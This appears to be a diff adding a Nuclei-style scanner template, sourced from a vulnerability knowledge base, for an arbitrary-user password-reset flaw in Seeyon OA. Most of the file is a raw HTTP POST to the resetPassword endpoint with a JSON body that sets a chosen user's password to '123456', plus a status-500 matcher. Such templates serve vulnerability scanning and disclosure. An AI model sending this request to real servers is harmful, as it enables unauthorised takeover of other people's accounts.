@@ -1,0 +1,45 @@
+id: poc-gdkawxyn7odi2kzp
+info:
+  name: 致远 OA 任意用户密码重置
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gdkawxyn7odi2kzp'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gdkawxyn7odi2kzp
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1
+
+
+    Content-Type: application/json
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    {"loginName":"vdkjfhgigfsjd34rvsdj","password":"123456"}
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    code
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
